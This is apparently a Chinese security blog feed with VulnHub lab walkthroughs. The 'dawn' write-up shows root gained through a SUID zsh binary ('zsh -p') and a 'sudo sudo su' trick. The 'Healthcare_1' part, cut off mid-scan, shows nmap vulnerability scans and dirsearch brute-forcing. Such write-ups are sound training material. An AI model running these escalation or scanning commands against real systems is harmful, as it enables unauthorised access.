env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User www-data may run the following commands on dawn:<br>    (root) NOPASSWD: /usr/bin/sudo<br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>好家伙竟然可以无密码以 root 权限运行 sudo，直接 sudo su 试试？</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@dawn:/home/dawn$ /usr/bin/sudo su<br>/usr/bin/sudo su<br><br>We trust you have received the usual lecture from the <span class="hljs-built_in">local</span> System<br>Administrator. It usually boils down to these three things:<br><br>    <span class="hljs-comment">#1) Respect the privacy of others.</span><br>    <span class="hljs-comment">#2) Think before you type.</span><br>    <span class="hljs-comment">#3) With great power comes great responsibility.</span><br><br>[sudo] password <span class="hljs-keyword">for</span> www-data: <br><br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> www-data: <br><br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> www-data: <br><br>sudo: 3 incorrect password attempts<br></code></pre></td></tr></table></figure><p>要输密码？？我不理解</p><p>接下来就这个命令尝试了各种方法，但是均需要密码，还尝试了用网站根目录下隐藏的文件中的内容作为密码，也都失败了</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs elixir">www-data<span class="hljs-variable">@dawn</span><span class="hljs-symbol">:/home/dawn</span><span class="hljs-variable">$ </span>sudo nano<br>sudo nano<br><br><span class="hljs-title class_">We</span> trust you have received the usual lecture from the local <span class="hljs-title class_">System</span><br><span class="hljs-title class_">Administrator</span>. <span class="hljs-title class_">It</span> usually boils down to these three <span class="hljs-symbol">things:</span><br><br>    <span class="hljs-comment">#1) Respect the privacy of others.</span><br>    <span class="hljs-comment">#2) Think before you type.</span><br>    <span class="hljs-comment">#3) With great power comes great responsibility.</span><br><br>[sudo] password <span class="hljs-keyword">for</span> www-<span class="hljs-symbol">data:</span> <br></code></pre></td></tr></table></figure><p>家人们还是看看远方的定时任务和 SUID 吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@dawn:/home/ganimedes$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># Example of job definition:</span><br><span class="hljs-comment"># .---------------- minute (0 - 59)</span><br><span class="hljs-comment"># |  .------------- hour (0 - 23)</span><br><span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span><br><span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-comment"># |  |  |  |  |</span><br><span class="hljs-comment"># *  *  *  *  * user-name command to be executed</span><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-comment">#</span><br>www-data@dawn:/home/ganimedes$ find / -<span class="hljs-built_in">type</span> f -perm -04000 2&gt;/dev/null<br>find / -<span class="hljs-built_in">type</span> f -perm -04000 2&gt;/dev/null<br>/usr/sbin/mount.cifs<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/policykit-1/polkit-agent-helper-1<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/openssh/ssh-keysign<br>/usr/bin/su<br>/usr/bin/newgrp<br>/usr/bin/pkexec<br>/usr/bin/passwd<br>/usr/bin/sudo<br>/usr/bin/mount<br>/usr/bin/zsh<br>/usr/bin/gpasswd<br>/usr/bin/chsh<br>/usr/bin/umount<br>/usr/bin/chfn<br></code></pre></td></tr></table></figure><p>好家伙，zsh 也是 SUID，这么简单就提权了吗</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@dawn:/home/ganimedes$ /usr/bin/zsh -p<br>/usr/bin/zsh -p<br>dawn<span class="hljs-comment"># whoami                                                                   </span><br><span class="hljs-built_in">whoami</span><br>root<br>dawn<span class="hljs-comment"># id                                                                       </span><br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) euid=0(root) <span class="hljs-built_in">groups</span>=33(www-data)<br>dawn<span class="hljs-comment"># ip a                                                                     </span><br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:84:97:e0 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.134/24 brd 192.168.56.255 scope global dynamic enp0s3<br>       valid_lft 506sec preferred_lft 506sec<br>    inet6 fe80::a00:27ff:fe84:97e0/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>dawn<span class="hljs-comment"># uname -a                                                                 </span><br><span class="hljs-built_in">uname</span> -a<br>Linux dawn 4.19.0-5-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.37-5+deb10u1 (2019-07-19) x86_64 GNU/Linu</span><br></code></pre></td></tr></table></figure><p>还真是，竟然这么快就结束了，确实是 easy 难度的靶机，不过定时任务没起来导致日志文件没信息可难受死我了。收尾 flag。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">dawn<span class="hljs-comment"># cd /root                                                                 </span><br><span class="hljs-built_in">cd</span> /root<br>dawn<span class="hljs-comment"># ls                                                                       </span><br><span class="hljs-built_in">ls</span><br>flag.txt  pspy64<br>dawn<span class="hljs-comment"># cat flag.txt                                                             </span><br><span class="hljs-built_in">cat</span> flag.txt<br>Hello! whitecr0wz here. I would like to congratulate and thank you <span class="hljs-keyword">for</span> finishing the ctf, however, there is another way of getting a shell(very similar though). Also, 4 other methods are available <span class="hljs-keyword">for</span> rooting this box!<br><br>flag&#123;3a3e52f0a6af0d6e36d7c1ced3a9fd59&#125;<br></code></pre></td></tr></table></figure><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>关于 sudo 如何切换用户不需要密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo sudo su<br><span class="hljs-built_in">whoami</span><br>root<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Healthcare_1 靶机</title>
    <link href="/2023/08/c7207977b36b.html"/>
    <url>/2023/08/c7207977b36b.html</url>
    
    <content type="html"><![CDATA[<h1 id="Healthcare-1-靶机"><a href="#Healthcare-1-靶机" class="headerlink" title="Healthcare_1 靶机"></a>Healthcare_1 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Healthcare]<br>└─$ sudo nmap --min-rate 10000 -p- 192.1.1.141<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-09 18:30 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.141<br>Host is up (0.000064s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>21/tcp open  ftp<br>80/tcp open  http<br>MAC Address: 00:0C:29:95:F1:6A (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.09 seconds<br></code></pre></td></tr></table></figure><p>只开放了 21 和 80 端口，看看 UDP 扫描的结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Healthcare]<br>└─$ sudo nmap --top-ports 20 -sU 192.1.1.141   <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-10 13:23 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.141<br>Host is up (0.00022s latency).<br><br>PORT      STATE         SERVICE<br>53/udp    closed        domain<br>67/udp    open|filtered dhcps<br>68/udp    open|filtered dhcpc<br>69/udp    closed        tftp<br>123/udp   closed        ntp<br>135/udp   open|filtered msrpc<br>137/udp   open|filtered netbios-ns<br>138/udp   open|filtered netbios-dgm<br>139/udp   closed        netbios-ssn<br>161/udp   closed        snmp<br>162/udp   open|filtered snmptrap<br>445/udp   closed        microsoft-ds<br>500/udp   closed        isakmp<br>514/udp   closed        syslog<br>520/udp   closed        route<br>631/udp   open|filtered ipp<br>1434/udp  closed        ms-sql-m<br>1900/udp  closed        upnp<br>4500/udp  open|filtered nat-t-ike<br>49152/udp open|filtered unknown<br>MAC Address: 00:0C:29:95:F1:6A (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 15.16 seconds<br></code></pre></td></tr></table></figure><p>盯着 21 和 80 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Healthcare]<br>└─$ sudo nmap -sT -sV -sC -O -p21,80 192.1.1.141<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-09 18:31 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.141<br>Host is up (0.00035s latency).<br><br>PORT   STATE SERVICE VERSION<br>21/tcp open  ftp     ProFTPD 1.3.3d<br>80/tcp open  http    Apache httpd 2.2.17 ((PCLinuxOS <span class="hljs-number">2011</span>/PREFORK-<span class="hljs-number">1</span>pclos2011))<br>|_http-title: Coming Soon 2<br>| http-robots.txt: 8 disallowed entries <br>| /manual/ /manual-2.2/ /addon-modules/ /doc/ /images/ <br>|_/all_our_e-mail_addresses /admin/ /<br>|_http-server-header: Apache/2.2.17 (PCLinuxOS 2011/PREFORK-1pclos2011)<br>MAC Address: 00:0C:29:95:F1:6A (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 2.6.X<br>OS CPE: cpe:/o:linux:linux_kernel:2.6.38<br>OS details: Linux 2.6.38<br>Network Distance: 1 hop<br>Service Info: OS: Unix<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 14.71 seconds<br><br></code></pre></td></tr></table></figure><p>有 <code>robots.txt</code> 文件，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Healthcare]<br>└─$ sudo nmap --script=vuln -p21,80 192.1.1.141 <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-09 18:32 EDT<br>Pre-scan script results:<br>| broadcast-avahi-dos: <br>|   Discovered hosts:<br>|     224.0.0.251<br>|   After NULL UDP avahi packet DoS (CVE-2011-1002).<br>|   Hosts that seem down (vulnerable):<br>|_    224.0.0.251<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.141<br>Host is up (0.00018s latency).<br><br>PORT   STATE SERVICE<br>21/tcp open  ftp<br>80/tcp open  http<br>| http-slowloris-check: <br>|   VULNERABLE:<br>|   Slowloris DOS attack<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2007-6750<br>|       Slowloris tries to keep many connections to the target web server open and hold<br>|       them open as long as possible.  It accomplishes this by opening connections to<br>|       the target web server and sending a partial request. By doing so, it starves<br>|       the http server\<span class="hljs-string">&#x27;s resources causing Denial Of Service.</span><br><span class="hljs-string">|       </span><br><span class="hljs-string">|     Disclosure date: 2009-09-17</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://ha.ckers.org/slowloris/</span><br><span class="hljs-string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="hljs-string">| http-vuln-cve2011-3192: </span><br><span class="hljs-string">|   VULNERABLE:</span><br><span class="hljs-string">|   Apache byterange filter DoS</span><br><span class="hljs-string">|     State: VULNERABLE</span><br><span class="hljs-string">|     IDs:  BID:49303  CVE:CVE-2011-3192</span><br><span class="hljs-string">|       The Apache web server is vulnerable to a denial of service attack when numerous</span><br><span class="hljs-string">|       overlapping byte ranges are requested.</span><br><span class="hljs-string">|     Disclosure date: 2011-08-19</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192</span><br><span class="hljs-string">|       https://www.tenable.com/plugins/nessus/55976</span><br><span class="hljs-string">|       https://www.securityfocus.com/bid/49303</span><br><span class="hljs-string">|_      https://seclists.org/fulldisclosure/2011/Aug/175</span><br><span class="hljs-string">|_http-dombased-xss: Couldn\&#x27;</span>t find any DOM based XSS.<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-csrf: Couldn\&#x27;</span>t find any CSRF vulnerabilities.<br>| http-fileupload-exploiter: <br>|   <br>|     Couldn\<span class="hljs-string">&#x27;t find a file-type field.</span><br><span class="hljs-string">|   </span><br><span class="hljs-string">|     Couldn\&#x27;</span>t find a file-type field.<br>|   <br>|_    Couldn\<span class="hljs-string">&#x27;t find a file-type field.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|_  /robots.txt: Robots file</span><br><span class="hljs-string">MAC Address: 00:0C:29:95:F1:6A (VMware)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 354.24 seconds</span><br></code></pre></td></tr></table></figure><p>没什么收获，看看 Web 界面的 robots.txt 和 21 ftp 吧</p><h2 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><p>ftp 拿到了版本信息 <code>ProFTPD 1.3.3d</code>，尝试搜索该版本的漏洞，无收获。尝试匿名登录，失败。尝试查看 Web 服务</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs txt"># $Id: robots.txt 410967 2009-08-06 19:44:54Z oden $<br># $HeadURL: svn+ssh://svn.mandriva.com/svn/packages/cooker/apache-conf/current/SOURCES/robots.txt $<br># exclude help system from robots<br>User-agent: *<br>Disallow: /manual/<br>Disallow: /manual-2.2/<br>Disallow: /addon-modules/<br>Disallow: /doc/<br>Disallow: /images/<br># the next line is a spam bot trap, for grepping the logs. you should _really_ change this to something else...<br>Disallow: /all_our_e-mail_addresses<br># same idea here...<br>Disallow: /admin/<br># but allow htdig to index our doc-tree<br>#User-agent: htdig<br>#Disallow:<br># disallow stress test<br>user-agent: stress-agent<br>Disallow: /<br></code></pre></td></tr></table></figure><p>根据 robots.txt 中的注释，似乎使用 <code>User-agent: htdig</code> 的话似乎可以查看索引，并且 <code>/all_our_e-mail_addresses</code> 和 <code>/admin/</code> 是针对爬虫机器人的陷阱</p><p>按理说 robots.txt 是君子协定，不知道访问上述目录是否需要特别设置 User-agent ，都尝试一遍得了</p><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>目录爆破也同时进行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Healthcare]<br>└─$ sudo dirsearch -u http://192.1.1.141      <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.1.1.141/_23-08-09_18-40-10.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-08-09_18-40-10.<span class="hljs-built_in">log</span><br><br>Target: http://192.1.1.141/<br><br>[18:40:10] Starting: <br>[18:40:10] 301 -  334B  - /js  -&gt;  http://192.1.1.141/js/                  <br>[18:40:11] 403 -  997B  - /.cgi                                            <br>[18:40:12] 403 -  997B  - /.ht_wsr.txt                                     <br>[18:40:12] 403 -  997B  - /.htaccess.orig<br>[18:40:12] 403 -  997B  - /.htaccess.save<br>[18:40:12] 403 -  997B  - /.htaccess.sample<br>[18:40:12] 403 -  997B  - /.htaccess.bak1<br>[18:40:12] 403 -  997B  - /.htaccessOLD<br>[18:40:12] 403 -  997B  - /.htaccessOLD2<br>[18:40:12] 403 -  997B  - /.htaccess_orig<br>[18:40:12] 403 -  997B  - /.htaccessBAK<br>[18:40:12] 403 -  997B  - /.htaccess_sc<br>[18:40:12] 403 -  997B  - /.htaccess_extra                                 <br>[18:40:12] 403 -  997B  - /.html<br>[18:40:12] 403 -  997B  - /.htm<br>[18:40:12] 403 -  997B  - /.httr-oauth                                     <br>[18:40:12] 403 -  997B  - /.htpasswd_test<br>[18:40:12] 403 -  997B  - /.htpasswds                                      <br>[18:40:14] 403 -  997B  - /AT-admin.cgi                                     <br>[18:40:16] 403 -  997B  - /WebShell.cgi                                     <br>[18:40:17] 403 -  997B  - /accounts.cgi                                     <br>[18:40:17] 403 -  997B  - /adm.cgi                                          <br>[18:40:17] 403 -  997B  - /admin.cgi                                        <br>[18:40:22] 403 -  997B  - /apply.cgi                                        <br>[18:40:22] 403 -  997B  - /auth.cgi                                         <br>[18:40:23] 403 -  997B  - /cachemgr.cgi                                     <br>[18:40:23] 403 - 1011B  - /cgi-bin/                                         <br>[18:40:24] 200 -    1KB - /cgi-bin/test.cgi                                 <br>[18:40:25] 301 -  335B  - /css  -&gt;  http://192.1.1.141/css/                 <br>[18:40:26] 403 -  997B  - /dcadmin.cgi                                      <br>[18:40:27] 403 - 1011B  - /error/                                           <br>[18:40:27] 200 -    1KB - /favicon.ico                                      <br>[18:40:28] 301 -  337B  - /fonts  -&gt;  http://192.1.1.141/fonts/             <br>[18:40:28] 403 -  997B  - /hndUnblock.cgi                                   <br>[18:40:29] 301 -  338B  - /images  -&gt;  http://192.1.1.141/images/           <br>[18:40:29] 403 - 1011B  - /images/                                          <br>[18:40:29] 200 -    5KB - /index.html                                       <br>[18:40:29] 200 -    5KB - /index                                            <br>[18:40:30] 403 - 1011B  - /js/                                              <br>[18:40:31] 403 -  997B  - /login.cgi                                        <br>[18:40:32] 403 -  997B  - /members.cgi                                      <br>[18:40:33] 403 -  997B  - /mt-check.cgi                                     <br>[18:40:34] 403 -  997B  - /out.cgi                                          <br>[18:40:34] 403 -  997B  - /perlcmd.cgi                                      <br>[18:40:35] 403 -   59B  - /phpMyAdmin                                       <br>[18:40:36] 403 -   59B  - /phpMyAdmin/                                      <br>[18:40:36] 403 -   59B  - /phpMyAdmin/index.php                             <br>[18:40:36] 403 -   59B  - /phpMyAdmin/scripts/setup.php                     <br>[18:40:36] 403 -   59B  - /phpMyAdmin/phpMyAdmin/index.php<br>[18:40:37] 403 -  997B  - /ps_admin.cgi                                     <br>[18:40:37] 200 -  620B  - /robots.txt                                       <br>[18:40:38] 403 - 1011B  - /server-status/                                   <br>[18:40:38] 403 -  997B  - /server-status                                    <br>[18:40:38] 403 -  997B  - /server-info                                      <br>[18:40:39] 403 -  997B  - /signin.cgi                                       <br>[18:40:43] 403 - 1011B  - /vendor/<br></code></pre></td></tr></table></figure><p>真正有用的目录 <code>/cgi-bin/test.cgi</code>，尝试爆破一下 <code>/cgi-bin</code> 目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Healthcare]<br>└─$ sudo dirsearch -u http://192.1.1.141/cgi-bin/ -e cgi,sh<br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                    <br> (_||| _) (/_(_|| (_| )                                                                                             <br>                                                                                                                    <br>Extensions: cgi, sh | HTTP method: GET | Threads: 30 | Wordlist size: 9515<br><br>Output File: /root/.dirsearch/reports/192.1.1.141/-cgi-bin-_23-08-10_11-15-35.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-08-10_11-15-35.<span class="hljs-built_in">log</span><br><br>Target: 